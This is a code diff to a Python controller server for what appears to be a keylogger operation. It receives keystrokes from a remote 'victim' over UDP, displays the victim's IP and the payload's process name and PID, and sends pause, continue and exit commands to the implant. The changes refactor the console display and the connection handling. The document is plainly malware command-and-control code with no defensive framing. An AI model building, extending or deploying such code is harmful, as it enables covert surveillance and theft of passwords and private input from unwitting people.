@@ -80,10 +80,15 @@ class ConsoleMenu:
         print("\033[32m" + "┃" + " " * padding + footer + " " * padding + " ┃" + "\033[0m")
         print("\033[32m" + "┗" + "━" * menu_width + "┛" + "\033[0m")
 
-    def draw_console(self, info_victim, buffer):
+    def draw_console(self, ip_victim=None, info_payload=None, info_victim=None, buffer=None):
         self.base_menu()
-        print("\033[32m" + info_victim + "\033[0m")
-        # print("┗" + "━" * menu_width + "┛")
+        if info_victim:
+            print("\033[32m" + info_victim + "\033[0m")
+        if ip_victim and info_payload:
+            print("\033[32m" + f"Signal is monitored and sent from process {info_payload['process_name']} (PID: {info_payload['pid']}) "
+                    f"from ip address: {ip_victim}" + "\033[0m")
+        else:
+            print("\033[32m" + "No active victim connected." + "\033[0m")
         print("\033[32m" + "Keystroke operation ->", buffer, "\033[0m")
 
 
@@ -122,12 +127,22 @@ class ControllerServer:
         if option == 1:
             if self.consoleMenu.options[1] == "Pause":
                 self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Continue']}"
-                self.send_command("stop")
+                self.send_command("pause")
+                self.info_payload = {}
+                self.ip_victim = None
             else:
                 self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
-                self.send_command("start")
+                self.send_command("continue")
         if option == 2:
+            self.send_command("exit")
             self.running = False
+
+    def show_console(self):
+        self.consoleMenu.clear_screen()
+        self.consoleMenu.draw_console(info_victim=self.info_victim,
+                                      buffer=self.buffer,
+                                      ip_victim=self.ip_victim,
+                                      info_payload=self.info_payload)
 
     def on_press(self, key):
         try:
@@ -137,9 +152,7 @@ class ControllerServer:
                 self.consoleMenu.current_selection = (self.consoleMenu.current_selection + 1) % len(self.consoleMenu.options)
             elif key == Key.enter:
                 self.execute_selection()
-            self.consoleMenu.clear_screen()
-            self.consoleMenu.draw_console(info_victim=self.info_victim,
-                                            buffer=self.buffer)
+            self.show_console()
         except AttributeError:
             pass
 
@@ -152,21 +165,17 @@ class ControllerServer:
             pass
 
     def start_monitor(self):
-        self.consoleMenu.clear_screen()
-        self.consoleMenu.draw_console(info_victim=self.info_victim,
-                                            buffer=self.buffer)
+        self.show_console()
         with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             listener.join()
 
     def listen_clients(self, buffer_size: int = 8192):
-        # self.start_monitor()
         start_monitor_thread = threading.Thread(target=self.start_monitor)
         start_monitor_thread.start()
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
-        sock.settimeout(1)
-        #print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
+        sock.settimeout(2)
 
         try:
             while self.running:
@@ -183,15 +192,22 @@ class ControllerServer:
                         self.ip_victim = ip_victim
                         self.info_payload = info_payload
                         self.send_command(message="Server_active")
+                        if self.consoleMenu.options[1] == "continue":
+                            self.consoleMenu.options[1] = f"{self.consoleMenu.pause_continue['Pause']}"
+                        self.show_console()
                         continue
 
                     if signal:
                         self.buffer += data_str
-                        self.consoleMenu.clear_screen()
-                        self.consoleMenu.draw_console(info_victim=self.info_victim, buffer=self.buffer)
+                        self.show_console()
                     else:
                         self.buffer = ""
                 except socket.timeout as e:
+                    self.info_payload = {}
+                    self.ip_victim = None
+                    self.buffer = ""
+                    self.info_victim = None
+                    self.show_console()
                     continue
                 except json.JSONDecodeError as e:
                     pass
@@ -203,7 +219,7 @@ class ControllerServer:
         finally:
             sock.close()
             if start_monitor_thread.is_alive():
-                start_monitor_thread.join(timeout=2)
+                start_monitor_thread.join()
             print("Socket closed. Bye.")
 
 
